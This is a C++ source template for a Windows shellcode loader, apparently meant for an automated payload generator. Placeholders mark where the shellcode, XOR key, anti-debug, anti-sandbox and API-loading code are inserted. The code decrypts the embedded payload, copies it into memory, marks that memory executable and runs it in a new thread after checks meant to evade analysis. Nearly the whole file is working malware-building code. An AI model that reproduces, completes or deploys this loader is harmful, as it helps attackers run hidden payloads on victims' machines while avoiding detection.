#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h> 
#include <iostream>
#include <winternl.h>
#include "helper.h"

<SHELLCODE>

char key[] = <XOR_KEY>;
unsigned int key_len = sizeof(key);
unsigned int shellcode_len = sizeof(shellcode);


<ANTI_DEBUG>

<ANTI_SANDBOX>

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    void* payloadPtr = nullptr;
    BOOL rv;
    HANDLE th;
    DWORD oldProtect = 0;
    CREATETHREAD createThread;
    VIRTUALALLOC  virtualAlloc;
    VIRTUALPROTECT virtualProtect;

    // Anti debug check
    antiDebug();

    // Anti sandbox check
    antiSandbox();

    <LOAD_FUNCTIONS>

    // XOR shellcode
    xor_data(shellcode, shellcode_len, key, key_len);
    //printf("Shellcode decrypted, injecting\n");
    // Allocate memory to write payload into memory
    //printf("Allocating memory\n");
    payloadPtr = virtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy payload to memory
    //printf("Copying buffer\n");
    RtlMoveMemory(payloadPtr, shellcode, shellcode_len);
    xor_data(shellcode, shellcode_len, key, key_len);
    // Change permissions to RX
    //printf("Changing to execute permissions\n");
    rv = virtualProtect(payloadPtr, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);


    if (rv != 0)
    {
        //printf("Starting thread\n");
        //Create thread at start of memory
        th = createThread(0, 0, (LPTHREAD_START_ROUTINE)payloadPtr, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}
